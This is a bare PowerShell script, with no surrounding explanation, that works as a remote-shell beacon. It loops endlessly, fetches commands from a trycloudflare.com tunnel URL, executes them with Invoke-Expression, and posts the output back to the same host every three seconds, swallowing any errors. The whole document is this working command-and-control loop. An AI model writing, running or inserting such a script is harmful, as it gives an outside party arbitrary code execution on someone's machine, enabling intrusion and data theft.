$u='https://resorts-minimize-statute-filter.trycloudflare.com'

while($true){
    try{
        $c=(Invoke-WebRequest -Uri $u -UseBasicParsing).Content
        if($c -and $c -ne 'OK'){
            $r=iex $c 2>&1 | Out-String
            Invoke-WebRequest -Uri $u -Method POST -Body $r -UseBasicParsing
        }
    }catch{}
    Start-Sleep -Seconds 3
}
